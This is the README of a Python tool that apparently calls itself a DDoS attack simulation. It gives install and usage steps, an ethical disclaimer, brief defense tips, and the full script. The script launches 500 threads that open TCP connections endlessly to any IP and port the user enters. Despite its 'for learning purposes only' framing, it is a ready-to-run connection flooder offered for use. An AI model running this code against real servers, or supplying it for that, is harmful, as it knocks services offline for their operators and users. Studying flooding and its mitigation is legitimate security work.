# **DDoS Attack Simulation Tool** ⚠️  

*A Python-based educational tool demonstrating how DDoS attacks work using socket flooding (FOR LEARNING PURPOSES ONLY).*  

---

## **🔍 Overview**  

This script simulates a basic DDoS (Distributed Denial of Service) attack by flooding a target IP with multiple TCP connections. Created **strictly for cybersecurity education** to understand attack patterns and defense mechanisms.  

⚠️ **Warning:** Use only on authorized systems or local test environments. Unauthorized use is illegal.  

---

## **🛠️ Features**  
✔ Multi-threaded connection flooding  
✔ Real-time attack counter  
✔ Simple CLI interface  
✔ Educational value for network security  

---

## **🚀 Getting Started**  

### **Prerequisites**  
- Python 3.x  
- `socket` and `threading` modules (built-in)  

### **Installation**  
```bash
git clone https://github.com/winalkumarr123/Ddos-Tool.git
cd Ddos-Tool
```

### **Usage**  
Run the script:  
```bash
python Ddos.py
```  
Then enter:  
1. Target IP (e.g., `127.0.0.1` for local testing)  
2. Target port (e.g., `80` for HTTP)  

**Output Example:**  
```
number of connections sent: 1
number of connections sent: 2
...
```

---

## **📜 Ethical Disclaimer**  
❗ **This tool is for:**  
- Cybersecurity students learning about DDoS mitigation  
- Penetration testing (authorized environments only)  

❗ **Never use for:**  
- Unauthorized attacks  
- Harming networks/systems  
- Illegal activities  

Violations may result in **legal consequences**.  

---

## **🛡️ Defense Recommendations**  
To protect against such attacks:  
- Use rate limiting (e.g., `iptables`)  
- Configure firewalls to drop suspicious traffic  
- Deploy DDoS protection services (Cloudflare, AWS Shield)  

---

## **📝 Code Breakdown**  
```python
import socket
from threading import Thread

target = input("Enter target IP: ")  # Target server IP
port = int(input("Enter target port: "))  # e.g., 80 for HTTP
attack_num = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))  # Floods target with connections
        global attack_num
        attack_num += 1
        print(f"Connections sent: {attack_num}")

# Launch 500 threads to amplify attack
for _ in range(500):
    Thread(target=attack).start()
```

---

## **📬 Contact**  
For educational inquiries:  
🔗 [LinkedIn](https://www.linkedin.com/in/vimal-kumar-r-aa8265184?lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_contact_details%3BuHvqf2JGRwS1wdpubCkHuQ%3D%3D) | 📧 vimalkumarr738@gmail.com  

